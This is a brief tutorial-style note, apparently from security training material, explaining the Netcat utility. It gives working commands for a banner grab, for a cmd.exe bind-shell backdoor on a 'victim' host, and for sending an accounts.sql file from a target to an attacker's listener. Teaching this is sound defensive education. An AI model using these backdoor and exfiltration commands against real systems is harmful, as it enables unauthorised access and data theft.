# Ncat

Netcat

One simple but effective tool for testing connectivity is Netcat (nc), available for both Windows and Linux. Netcat is a computer networking utility for reading and writing raw data over a network connection, and can be used for port scanning and fingerprinting. For example, the following command attempts to connect to the HTTP port on a server and return any banner by sending the "head" HTTP keyword:

echo "head" | nc 10.1.0.1 -v 80

Netcat can also establish connections with remote machines. To configure Netcat as a backdoor, you first set up a listener on the victim system (IP: 10.1.0.1) set to pipe traffic from a program, such as the command interpreter, to its handler:

nc -l -p 666 -e cmd.exe

The following command connects to the listener and grants access to the terminal:

nc 10.1.0.1 666

Used the other way around, Netcat can be used to receive files. For example, on the target system the attacker runs the following:

type accounts.sql | nc 10.1.0.192 6666

On the handler (IP 10.1.0.192), the attacker receives the file using the following command:

nc -l -p 6666 > accounts.sql
